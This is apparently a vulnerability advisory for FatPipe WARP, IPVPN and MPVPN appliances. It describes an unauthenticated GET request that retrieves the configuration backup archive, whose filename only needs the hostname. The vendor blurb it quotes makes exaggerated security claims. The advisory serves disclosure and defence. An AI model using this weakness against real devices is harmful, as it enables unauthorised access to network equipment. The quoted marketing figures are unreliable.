Summary: FatPipe Networks invented the concept of router-clustering,
which provides the highest level of reliability, redundancy, and speed
of Internet traffic for Business Continuity and communications. FatPipe
WARP achieves fault tolerance for companies by creating an easy method
of combining two or more Internet connections of any kind over multiple
ISPs. FatPipe utilizes all paths when the lines are up and running,
dynamically balancing traffic over the multiple lines, and intelligently
failing over inbound and outbound IP traffic when ISP services and/or
components fail.

FatPipe IPVPN balances load and provides reliability among multiple
managed and CPE based VPNs as well as dedicated private networks. FatPipe
IPVPN can also provide you an easy low-cost migration path from private
line, Frame or Point-to-Point networks. You can aggregate multiple private,
MPLS and public networks without additional equipment at the provider's
site.

FatPipe MPVPN, a patented router clustering device, is an essential part
of Disaster Recovery and Business Continuity Planning for Virtual Private
Network (VPN) connectivity. It makes any VPN up to 900% more secure and
300% times more reliable, redundant and faster. MPVPN can take WANs with
an uptime of 99.5% or less and make them 99.999988% or higher, providing
a virtually infallible WAN. MPVPN dynamically balances load over multiple
lines and ISPs without the need for BGP programming. MPVPN aggregates up
to 10Gbps - 40Gbps of bandwidth, giving you all the reliability and speed
you need to keep your VPN up and running despite failures of service, line,
software, or hardware.

Desc: The application is vulnerable to unauthenticated configuration disclosure
when direct object reference is made to the backup archive file using an HTTP
GET request. The only unknown part of the filename is the hostname of the system.
This will enable the attacker to disclose sensitive information and help her
in authentication bypass, privilege escalation and full system access.

Tested on: Apache-Coyote/1.1
